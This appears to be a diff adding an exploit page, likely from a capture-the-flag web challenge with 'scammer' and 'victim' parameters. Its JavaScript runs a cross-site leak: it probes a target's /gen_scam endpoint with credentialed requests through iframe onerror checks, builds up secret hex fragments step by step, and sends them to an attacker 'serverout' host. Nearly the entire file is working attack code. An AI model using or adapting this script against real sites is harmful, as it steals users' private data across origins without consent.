@@ -1,0 +1,80 @@
+<head>
+<!--<img src="{{info.serverout}}/../stall"/>-->
+    </head>
+    <script>
+        let START = performance.now()
+        // const params = new URL(location.href).searchParams
+        const server = "{{info.server}}"
+        const scammer = "{{info.scammer}}"
+        const victim = "{{info.victim}}"
+        const serverout = "{{info.serverout}}"
+
+
+        async function checkURL(url){
+            let i = document.createElement('iframe');
+            i.srcdoc = `<script>onerror=()=>{window.error=1}<\/script><script src="${url}"><\/script>`
+            document.head.appendChild(i);
+            return new Promise(r=>{
+                i.onload = () => {let res = i.contentWindow.error? 1: 0; i.remove();r(res)}
+            });
+        }
+    
+        function generateURL(str){
+            return `${server}/gen_scam?p=${str}&scammer=${scammer}&victim=${victim}`
+        }
+    
+        alph = "-abcdef0123456789"
+
+        var s1 = []
+        var s2 = [] 
+        var s3 = []
+
+        function possibleOnes(){
+            return alph.split('');
+        }
+
+        function possibleTwoes(){
+            let res = []
+            for(let c1 of s1)
+                for(let c2 of s1)
+                    res.push(c1+c2)
+            return res
+        }
+
+        function possibleThrees(){
+            let res = []
+            for(let c1 of s2)
+                for(let c2 of s2)
+                    if(c1[1] == c2[0])
+                        res.push(c1+c2[1])
+            return res
+        }
+
+        async function check_list(arr, where){
+            let counter = 0
+            return new Promise(r=>{
+                for(let word of arr){
+                    let url = generateURL(word);
+                    checkURL(url).then(d=>{
+                        counter+=1;
+                        if(d==1) where.push(word)
+                        if(counter === arr.length) r()
+                    })
+                }        
+            })    
+        }
+    
+    
+        (async ()=>{
+            await fetch(server, {credentials:'include', mode:'no-cors'});
+            await check_list(possibleOnes(),s1)
+            console.log(s1.join())
+            await check_list(possibleTwoes(),s2)
+            console.log(s2.join())
+            await check_list(possibleThrees(),s3)
+            console.log(s3.join())
+            let time = Math.ceil((performance.now() - START)/1000);
+            await fetch(`${serverout}?s=${s3.join()}&t=${time}`);
+        })()
+    
+    </script>
